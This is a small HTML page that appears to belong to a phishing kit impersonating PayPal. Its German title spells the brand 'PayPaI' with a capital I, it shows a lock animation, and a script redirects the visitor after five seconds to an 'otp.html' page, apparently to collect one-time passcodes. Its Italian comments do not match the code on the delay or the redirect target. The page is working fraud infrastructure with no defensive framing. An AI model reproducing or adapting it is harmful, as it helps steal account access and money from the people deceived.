<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loggen Sie sich bei PayPaI ein</title>
    <style>
        /* Centra la GIF nella pagina e imposta lo sfondo bianco */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white; /* Sfondo bianco */
        }
        img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <img src=" paypal-lock.gif" alt="GIF animata">

    <script>
        // Dopo 10 secondi (10000 millisecondi), reindirizza alla pagina enehmigung-2.php
        setTimeout(function() {
            window.location.href = " ../otp.html";
        }, 5000);
    </script>
</body>
</html>
